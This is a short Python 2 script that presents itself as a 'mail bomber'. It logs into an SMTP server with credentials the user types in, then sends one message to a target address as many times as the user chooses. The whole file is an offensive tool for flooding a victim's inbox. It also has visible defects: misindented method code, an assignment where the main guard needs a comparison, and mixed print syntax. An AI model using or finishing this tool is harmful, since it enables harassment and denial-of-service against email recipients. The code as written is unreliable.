import smtplib
import mimetypes
import sys
import time
from email.MIMEText import MIMEText

class SMTP(object):
    def title(self):
        print('[+] PYTHON MAIL BOMBER: SUCCESS')
    def SMTPconnect(self):
        print('We are in the SMTPconnect')
        self.smtpserver = raw_input('\nEnter SMTP Server: ')
        self.smtpport = input('Enter SMTP Port (e.g. 25 or 465): ')
        try:
            self.mailServer = smtplib.SMTP(self.smtpserver, self.smtpport)
        except IOError, e:
            print('Error: %s' %(e))
            time.sleep(5)
            sys.exit(1)
        self.mailServer.starttls()
        self.username=raw_input('\nEnter Username: ')
        self.password=raw_input('Enter Password: ')
        try:
              self.mailServer.login(self.username,self.password)
        except BaseException, e:
              print 'Error: %s' % (e)
              time.sleep(3)
              sys.exit(1)
    def buildEmail(self):
        print('We are inside buildEmail')
        print('\tBuilding Message Part')
            self.From = raw_input("\nFrom: ")
            self.To = raw_input("\nTo: ")
            self.Subject = raw_input("\nSubject: ")
            self.Message = raw_input("\nMessage: ")
            messageData = MIMEText(self.Message)
            messageData['From']=self.From
            messageData['To']=self.To
            messageData['Subject']=self.Subject
            self.amount = input('How many times would you like to send the message: ')
            x = 0
            while x < self.amount:
                self.mailServer.sendmail(self.From, self.To, messageData.as_string())
                x += 1
            print('Send %d messages to %s' %(self.amount, self.To))
            time.sleep(7)

if __name__ = '__main__':
    s = SMTP()
    s.title()
    s.SMTPconnect()
    s.buildEmail()
